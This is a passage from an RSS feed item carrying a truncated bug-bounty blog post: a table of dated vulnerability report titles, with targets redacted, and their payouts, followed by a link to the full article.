<td>Multiple server-side issues affecting [redacted] (SSRF, admin panels)</td>
<td>$2,660.00</td>
</tr>
<tr>
<td>2019-09-25 22:10:00 UTC</td>
<td>Read any [redacted] details using UUID - IDOR in [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2019-09-10 16:17:59 UTC</td>
<td>SSRF in [redacted]</td>
<td>$2,000.00</td>
</tr>
<tr>
<td>2019-09-03 15:28:36 UTC</td>
<td>SSRF in [redacted]</td>
<td>$17,900.00</td>
</tr>
<tr>
<td>2019-08-29 00:43:00 UTC</td>
<td>Bypassing email whitelists for organisation signup flows on [redacted]</td>
<td>$250.00</td>
</tr>
<tr>
<td>2019-08-09 05:15:44 UTC</td>
<td>[Pre-Submission] SSRF in [redacted] (Iframely)</td>
<td>$2,970.30</td>
</tr>
<tr>
<td>2019-07-29 16:32:59 UTC</td>
<td>[Bypass] SSRF via [redacted] leads to internal network access, ability to read internal JSON responses</td>
<td>$23,000.00</td>
</tr>
<tr>
<td>2019-07-24 02:52:42 UTC</td>
<td>PHPInfo exposed at [redacted]</td>
<td>$100.00</td>
</tr>
<tr>
<td>2019-07-24 02:46:02 UTC</td>
<td>SSRF on [redacted] leading to AWS breach via security credentials</td>
<td>$5,000.00</td>
</tr>
<tr>
<td>2019-07-08 14:44:23 UTC</td>
<td>Remote command execution on production [redacted] (via tsi parameter) - CVE-2017-12611</td>
<td>$2,000.00</td>
</tr>
<tr>
<td>2019-06-12 17:42:53 UTC</td>
<td>Username/Password for Aspera and other secrets leaked in [redacted]</td>
<td>$1,500.00</td>
</tr>
<tr>
<td>2019-06-12 17:42:08 UTC</td>
<td>SSO/Authorization bypass for APIs hosted on [redacted]</td>
<td>$1,500.00</td>
</tr>
<tr>
<td>2019-06-12 14:45:09 UTC</td>
<td>Remote Code Execution (many endpoints) - [redacted]</td>
<td>$4,500.00</td>
</tr>
<tr>
<td>2019-06-10 17:29:35 UTC</td>
<td>Extract email, dob, full address, federal tax ID and other PII for all leads in [redacted]</td>
<td>$1,800.00</td>
</tr>
<tr>
<td>2019-06-10 16:53:22 UTC</td>
<td>Obtain email, mobile of customers of [redacted] by iterating through Lead IDs via the API</td>
<td>$12,600.00</td>
</tr>
<tr>
<td>2019-06-10 16:52:40 UTC</td>
<td>Ability to pull out all opportunities (IDOR) extract PII for customers of [redacted]</td>
<td>$12,600.00</td>
</tr>
<tr>
<td>2019-06-07 18:51:24 UTC</td>
<td>[redacted][IDOR] - Accessing all accounts via regression / new attack vector by abusing [redacted] (regression?)</td>
<td>$2,500.00</td>
</tr>
<tr>
<td>2019-06-07 18:17:31 UTC</td>
<td>Blind SSRF on [redacted] through RPC call to checkAvailableLivechatAgents</td>
<td>$62.50</td>
</tr>
<tr>
<td>2019-06-07 18:07:22 UTC</td>
<td>HTML injection in emails when adding a reviewer to [redacted]</td>
<td>$125.00</td>
</tr>
<tr>
<td>2019-06-07 17:42:09 UTC</td>
<td>[IDOR] Impersonating an [redacted] employee via /api/readHandler on [redacted]</td>
<td>$1,500.00</td>
</tr>
<tr>
<td>2019-06-07 15:33:31 UTC</td>
<td>Extract mobile number and [redacted] using only an email address, for any [redacted]</td>
<td>$750.00</td>
</tr>
<tr>
<td>2019-06-07 14:36:01 UTC</td>
<td>Zendesk Ticket IDOR / Ability to enumerate  IDs via [redacted]</td>
<td>$125.00</td>
</tr>
<tr>
<td>2019-06-07 14:24:15 UTC</td>
<td>Extract mobile number and [redacted] using only an email address, for any [redacted] user</td>
<td>$750.00</td>
</tr>
<tr>
<td>2019-06-07 14:11:20 UTC</td>
<td>HTML Injection in [redacted] receipts if printed from [redacted]</td>
<td>$100.00</td>
</tr>
<tr>
<td>2019-06-07 13:56:46 UTC</td>
<td>Ability to access the airwatch admin panels and APIs in [redacted]</td>
<td>$1,000.00</td>
</tr>
<tr>
<td>2019-06-07 13:21:31 UTC</td>
<td>IDOR on [redacted] allows you to access [redacted] information for any [redacted] user</td>
<td>$250.00</td>
</tr>
<tr>
<td>2019-06-07 10:13:20 UTC</td>
<td>[redacted][IDOR] - Accessing all accounts via regression / new attack vector by abusing [redacted] (regression?)</td>
<td>$15,000.00</td>
</tr>
<tr>
<td>2019-05-22 19:33:27 UTC</td>
<td>SQLi and Authentication Bypass in [redacted]</td>
<td>$4,500.00</td>
</tr>
<tr>
<td>2019-04-29 14:14:42 UTC</td>
<td>Reflected XSS in [redacted]</td>
<td>$500.00</td>
</tr>
<tr>
<td>2019-04-29 14:14:29 UTC</td>
<td>SSRF in [redacted]</td>
<td>$1,500.00</td>
</tr>
<tr>
<td>2019-04-25 07:33:22 UTC</td>
<td>Local file disclosure through Rails CVE-2019-5418 in [redacted]</td>
<td>$100.00</td>
</tr>
<tr>
<td>2019-04-19 02:28:54 UTC</td>
<td>SSRF - [redacted]</td>
<td>$4,950.00</td>
</tr>
<tr>
<td>2019-04-19 02:28:35 UTC</td>
<td>SSRF at [redacted] via the 'url' parameter</td>
<td>$4,950.00</td>
</tr>
<tr>
<td>2019-03-29 11:23:14 UTC</td>
<td>AWS S3 secrets leaked in [redacted] meeting connector …</td></tr></tbody></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/">https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/</a></em></p>]]>
            </description>
            <link>https://blog.assetnote.io/2020/09/15/hacking-on-bug-bounties-for-four-years/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24500198</guid>
            <pubDate>Thu, 17 Sep 2020 01:29:10 GMT</pubDate>
        </item>
    </channel>
</rss>
